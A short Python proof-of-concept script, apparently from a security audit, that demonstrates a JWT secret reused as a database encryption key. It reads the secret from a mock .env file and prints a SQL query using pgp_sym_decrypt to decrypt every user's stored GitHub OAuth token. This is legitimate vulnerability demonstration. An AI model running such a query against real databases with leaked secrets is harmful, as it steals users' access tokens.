import os
from dotenv import load_dotenv
import psycopg2

# [S1] & [B3]: JWT secret reused as database encryption key
# This script demonstrates that if a JWT secret leaks (e.g., via a misconfigured
# frontend or brute forcing a weak HS256 secret), an attacker with database access 
# can decrypt every user's GitHub OAuth token.

load_dotenv(os.path.join(os.path.dirname(__file__), "..", ".env.mock"))
jwt_secret = os.getenv("JWT_SECRET")

# In a real exploit, the attacker connects to the DB using leaked credentials
# and runs the pgp_sym_decrypt function using the JWT secret.
print("=== JWT Key Reuse Exploit ===")
print(f"Leaked JWT Secret: {jwt_secret}")
print("\nExploit SQL:")
print(f"""
SELECT 
    id, 
    github_username, 
    pgp_sym_decrypt(github_access_token_encrypted, '{jwt_secret}') AS decrypted_token
FROM user_profiles;
""")
print("If the above query succeeds, it proves the JWT secret and DB encryption key are the same.")
